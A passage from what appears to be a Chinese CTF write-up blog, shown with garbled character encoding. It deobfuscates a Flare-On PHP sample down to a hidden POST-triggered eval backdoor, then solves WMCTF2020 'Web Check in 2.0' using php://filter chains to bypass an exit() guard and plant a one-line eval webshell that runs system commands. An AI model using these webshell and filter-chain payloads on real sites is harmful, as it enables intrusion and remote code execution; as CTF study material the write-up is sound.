class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">50</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">24</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">42</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">49</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">58</span>, <span class="hljs-number">66</span>, <span class="hljs-number">3</span>, <span class="hljs-number">86</span>, <span class="hljs-number">27</span>, <span class="hljs-number">88</span>, <span class="hljs-number">77</span>, <span class="hljs-number">80</span>, <span class="hljs-number">38</span>, <span class="hljs-number">25</span>, <span class="hljs-number">40</span>, <span class="hljs-number">81</span>, <span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">76</span>, <span class="hljs-number">81</span>, <span class="hljs-number">15</span>, <span class="hljs-number">50</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">24</span>, <span class="hljs-number">81</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">28</span>, <span class="hljs-number">7</span>, <span class="hljs-number">88</span>, <span class="hljs-number">32</span>, <span class="hljs-number">45</span>, <span class="hljs-number">7</span>, <span class="hljs-number">90</span>, <span class="hljs-number">52</span>, <span class="hljs-number">80</span>, <span class="hljs-number">58</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">66</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">50</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">72</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">11</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">91</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">49</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">45</span>, <span class="hljs-number">12</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">18</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">72</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">24</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">70</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">75</span>, <span class="hljs-number">11</span>, <span class="hljs-number">79</span>, <span class="hljs-number">28</span>, <span class="hljs-number">27</span>, <span class="hljs-number">75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">42</span>, <span class="hljs-number">23</span>, <span class="hljs-number">88</span>, <span class="hljs-number">30</span>, <span class="hljs-number">35</span>, <span class="hljs-number">47</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">35</span>, <span class="hljs-number">68</span>, <span class="hljs-number">38</span>, <span class="hljs-number">63</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">38</span>, <span class="hljs-number">45</span>, <span class="hljs-number">30</span>, <span class="hljs-number">81</span>, <span class="hljs-number">15</span>, <span class="hljs-number">50</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">24</span>, <span class="hljs-number">81</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">28</span>, <span class="hljs-number">23</span>, <span class="hljs-number">75</span>, <span class="hljs-number">77</span>, <span class="hljs-number">1</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>, <span class="hljs-number">43</span>, <span class="hljs-number">52</span>, <span class="hljs-number">31</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">75</span>, <span class="hljs-number">77</span>, <span class="hljs-number">35</span>, <span class="hljs-number">47</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">40</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">77</span>, <span class="hljs-number">49</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">70</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">49</span>, <span class="hljs-number">51</span>, <span class="hljs-number">4</span>, <span class="hljs-number">51</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">70</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">70</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">49</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">70</span>, <span class="hljs-number">21</span>, <span class="hljs-number">47</span>, <span class="hljs-number">93</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>, <span class="hljs-number">58</span>, <span class="hljs-number">82</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">82</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">29</span>, <span class="hljs-number">29</span>, <span class="hljs-number">47</span>);<br><span class="hljs-variable">$do_me</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$order</span>);<span class="hljs-variable">$i</span>++)<br>&#123;<br>    <span class="hljs-variable">$do_me</span>=<span class="hljs-variable">$do_me</span>.<span class="hljs-variable">$terms</span>[<span class="hljs-variable">$order</span>[<span class="hljs-variable">$i</span>]];<br>&#125;<br><span class="hljs-comment">#   echo($do_me);</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$do_me</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å›æ˜¾ä¸€ä¸‹do_meã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>= \<span class="hljs-string">&#x27;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\&#x27;;</span><br><span class="hljs-string">$__=\&#x27;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\&#x27;;</span><br><span class="hljs-string">$___=&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;;</span><br><span class="hljs-string">eval($___($__));</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>base64è§£ç ä¸€ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;\x61\x31\x31\x44\x4F\x54\x74\x68\x61\x74\x44\x4F\x54\x6A\x61\x76\x61\x35\x63\x72\x61\x70\x41\84\x66\x6C\x61\x72\x65\x44\65\x53\72\111\110\x44\79\84\99\x6F\x6D&quot;</span>]))<br>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D&quot;</span>]));<br>&#125;<br><span class="hljs-variable">$code</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ²¡æœ‰å»å†™è„šæœ¬äº†ã€‚\ åé¢è·Ÿåè¿›åˆ¶æ•°ï¼Œ\x åé¢è·Ÿåå…­è¿›åˆ¶æ•°ã€‚ç½‘ç«™ç›´æ¥16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 16è¿›åˆ¶">\x61\x31\x31\x44\x4F\x54\x74\x68\x61\x74\x44\x4F\x54\x6A\x61\x76\x61\x35\x63\x72\x61\x70\x41\x54\x66\x6C\x61\x72\x65\x44\x41\x53\x48\x6f\x6e\x44\x4f\x54\x63\x6F\x6D<br><br>a11DOTthatDOTjava5crapATflareDASHonDOTcom<br></code></pre></td></tr></table></figure><p>åç»­æ˜¯çœ‹äº†wpçš„ã€‚</p><p><strong>æŒ‰ç…§ flareon æ¯”èµ› flag çš„å°¿æ€§ï¼ŒDOT è¦æ¢æˆ .ï¼ŒAT æ¢æˆ @ï¼ŒDASH æ¢æˆ -ï¼Œå¾—åˆ°æœ€ç»ˆçš„ flag</strong><br>æœ€ç»ˆ<a href="mailto:&#97;&#49;&#49;&#46;&#x74;&#104;&#97;&#x74;&#46;&#x6a;&#97;&#118;&#97;&#x35;&#x63;&#114;&#97;&#x70;&#64;&#x66;&#108;&#97;&#114;&#x65;&#45;&#111;&#x6e;&#46;&#99;&#x6f;&#x6d;">&#97;&#49;&#49;&#46;&#x74;&#104;&#97;&#x74;&#46;&#x6a;&#97;&#118;&#97;&#x35;&#x63;&#114;&#97;&#x70;&#64;&#x66;&#108;&#97;&#114;&#x65;&#45;&#111;&#x6e;&#46;&#99;&#x6f;&#x6d;</a>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210449.png"></p><h2 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h2><p>è¿›å»ä¸€çœ‹ä»£ç  æ„Ÿè§‰è¯»æ‡‚äº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210648.png" alt="QQæˆªå›¾20220215113647"></p><p>æ´‹æ´‹å¾—æ„ç›´æ¥æ„é€ é“¾æ¥â€”&gt;<a href="http://48571e46-9b1c-4cf3-9889-cfbef23ea393.node4.buuoj.cn:81/?content=flag.php">http://48571e46-9b1c-4cf3-9889-cfbef23ea393.node4.buuoj.cn:81/?content=flag.php</a><br>å¾ˆæ‰“è„¸ã€‚<br>ç„¶åå†ä»”ç»†è¯»äº†è¯»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">exit</span>();&gt;<br></code></pre></td></tr></table></figure><p>è¿™ä¸æ˜¯ç›´æ¥å°±é€€å‡ºäº†å˜›ã€‚ç½‘ä¸Šç¿»é˜…å¾ˆä¹…èµ„æ–™åç»­çœ‹åˆ°pç¥çš„æ–‡ç« ã€‚<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><h3 id="ç»•è¿‡-lt-php-exit-gt"><a href="#ç»•è¿‡-lt-php-exit-gt" class="headerlink" title="ç»•è¿‡&lt;?php exit();&gt;"></a>ç»•è¿‡&lt;?php exit();&gt;</h3><p><a href="https://bbs.pediy.com/thread-271283.htm%E8%BF%99%E6%98%AFh3%E5%B8%88%E5%82%85%E7%9A%84%E6%96%87%E7%AB%A0%EF%BC%8C%E5%BB%BA%E8%AE%AE%E8%AF%A6%E8%AF%BB%E3%80%82">https://bbs.pediy.com/thread-271283.htmè¿™æ˜¯h3å¸ˆå‚…çš„æ–‡ç« ï¼Œå»ºè®®è¯¦è¯»ã€‚</a></p><h3 id="å·§ç”¨base64ç¼–ç "><a href="#å·§ç”¨base64ç¼–ç " class="headerlink" title="å·§ç”¨base64ç¼–ç "></a>å·§ç”¨base64ç¼–ç </h3><p>pç¥æ–‡ç« è®²çš„å¾ˆæ¸…æ¥šã€‚<br>è‡ªå·±ä¸å¾ˆæ¸…æ¥šç‚¹çš„ã€‚</p><ul><li>&#96;&#96;&#96;php<br>$content .&#x3D; $_POST[â€˜txtâ€™];  #è¿™é‡Œçš„ç‚¹æ˜¯è¿æ¥çš„æ„æ€ï¼Œå“ˆå“ˆå“ˆå°ç™½éå¸¸èœ ä»”ç»†è¯»pç¥çš„æ–‡ç« åŠä»–çš„å›¾ç‰‡+åŠçŒœåŠè’™<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- base64è§£ç æ–¹å¼ï¼šâ€œphpexitâ€ä¸€å…±<span class="hljs-number">7</span>ä¸ªå­—ç¬¦ï¼Œå› ä¸ºbase64ç®—æ³•è§£ç æ—¶æ˜¯<span class="hljs-number">4</span>ä¸ªbyteä¸€ç»„ï¼Œæ‰€ä»¥ç»™ä»–å¢åŠ <span class="hljs-number">1</span>ä¸ªâ€œaâ€ä¸€å…±<span class="hljs-number">8</span>ä¸ªå­—ç¬¦ã€‚è¿™æ ·ï¼Œ<span class="hljs-string">&quot;phpexita&quot;</span>è¢«æ­£å¸¸è§£ç ï¼Œè€Œåé¢æˆ‘ä»¬ä¼ å…¥çš„webshellçš„base64å†…å®¹ä¹Ÿè¢«æ­£å¸¸è§£ç ã€‚ç»“æœå°±æ˜¯`<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">exit</span>; <span class="hljs-meta">?&gt;</span>`æ²¡æœ‰äº†ã€‚<br><br>- ```php<br>  <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>])<br>  <span class="hljs-comment">#åŒ¹é…å­—ç¬¦ æ›¿æ¢æˆçš„å­—ç¬¦ æ›¿æ¢ç›®æ ‡</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="å·§ç”¨å­—ç¬¦ä¸²æ“ä½œ"><a href="#å·§ç”¨å­—ç¬¦ä¸²æ“ä½œ" class="headerlink" title="å·§ç”¨å­—ç¬¦ä¸²æ“ä½œ"></a>å·§ç”¨å­—ç¬¦ä¸²æ“ä½œ</h3><ul><li><pre><code class="php">&lt;?php exit; ?&gt; # å®é™…ä¸Šæ˜¯ä¸€ä¸ªXMLæ ‡ç­¾<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```php<br>  strip_tags() # â€” ä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®°<br></code></pre></td></tr></table></figure></code></pre></li><li><p>php:&#x2F;&#x2F;filterå…è®¸ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†webshellç”¨base64ç¼–ç ã€‚åœ¨è°ƒç”¨å®Œæˆstrip_tagsåå†è¿›è¡Œbase64-decodeã€‚â€œæ­»äº¡exitâ€åœ¨ç¬¬ä¸€æ­¥è¢«å»é™¤ï¼Œè€Œwebshellåœ¨ç¬¬äºŒæ­¥è¢«è¿˜åŸã€‚</p></li><li><p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨rot13ç¼–ç ç‹¬ç«‹å®Œæˆä»»åŠ¡ã€‚åŸç†å’Œä¸Šé¢ç±»ä¼¼ï¼Œæ ¸å¿ƒæ˜¯å°†â€œæ­»äº¡exitâ€å»é™¤ã€‚<code>&lt;?php exit; ?&gt;</code>åœ¨ç»è¿‡rot13ç¼–ç åä¼šå˜æˆ<code>&lt;?cuc rkvg; ?&gt;</code>ï¼Œåœ¨PHPä¸å¼€å¯short_open_tagæ—¶ï¼Œphpä¸è®¤è¯†è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå½“ç„¶ä¹Ÿå°±ä¸ä¼šæ‰§è¡Œäº†ã€‚</p></li></ul><h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h3><p>rot3åŠ å¯†ï¼š<a href="http://www.hiencode.com/rot13.html">http://www.hiencode.com/rot13.html</a><br>require_once:<a href="https://www.php.net/manual/zh/function.require-once.php">https://www.php.net/manual/zh/function.require-once.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">#rot3ç¼–ç </span><br>cuc @<span class="hljs-title function_ invoke__">riny</span>(<span class="hljs-variable">$_cbfg</span>[<span class="hljs-string">&#x27;pzq&#x27;</span>]);<br><br>php:<span class="hljs-comment">//filter/write=string.%7%32ot13|cuc @riny($_cbfg[&#x27;pzq&#x27;]);|/resource=shell.php </span><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215144143.png" alt="QQæˆªå›¾20220215144143"></p><p>è¿™é‡Œå°±å¯¼è‡´ä¸èƒ½ç›´æ¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå¯¼è‡´æ¯æ¬¡éƒ½è¦é‡å†™æ–‡ä»¶ã€‚(æ¥è‡ª<strong>H3h3QAQ</strong>)å¸ˆå‚…çš„è§£ç­”ã€‚</p><h3 id="è¿‡æ»¤å™¨ç»•è¿‡"><a href="#è¿‡æ»¤å™¨ç»•è¿‡" class="headerlink" title="è¿‡æ»¤å™¨ç»•è¿‡"></a>è¿‡æ»¤å™¨ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">?<br>content=php:<span class="hljs-comment">//filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=h3.php</span><br><br>?content=h3.php&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);  <br><br>?content=php:<span class="hljs-comment">//filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=h3.php</span><br><br>?content=h3.php&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>); <br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥é‡‡ç”¨h3å¸ˆå‚…çš„ç»•è¿‡ã€‚å“ˆå“ˆå“ˆã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210486.png" alt="QQæˆªå›¾20220215145358"></p><p><img 